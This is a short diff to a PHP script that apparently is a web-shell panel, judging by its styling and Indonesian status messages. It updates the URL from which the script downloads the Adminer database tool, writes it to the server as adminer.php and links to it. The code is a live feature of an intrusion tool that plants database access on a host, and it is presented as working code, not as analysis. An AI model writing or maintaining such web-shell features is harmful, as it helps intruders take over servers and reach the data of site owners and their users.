@@ -1333,7 +1333,7 @@ if($_GET['logout'] == true) {
 	if(file_exists('adminer.php')) {
 		echo "<center><font color=lime><a href='$full/adminer.php' target='_blank'>-> adminer login <-</a></font></center>";
 	} else {
-		if(adminer("https://www.adminer.org/static/download/4.2.4/adminer-4.2.4.php","adminer.php")) {
+		if(adminer("https://github.com/vrana/adminer/releases/download/v4.8.1/adminer-4.8.1-en.php","adminer.php")) {
 			echo "<center><font color=lime><a href='$full/adminer.php' target='_blank'>-> adminer login <-</a></font></center>";
 		} else {
 			echo "<center><font color=red>gagal buat file adminer</font></center>";
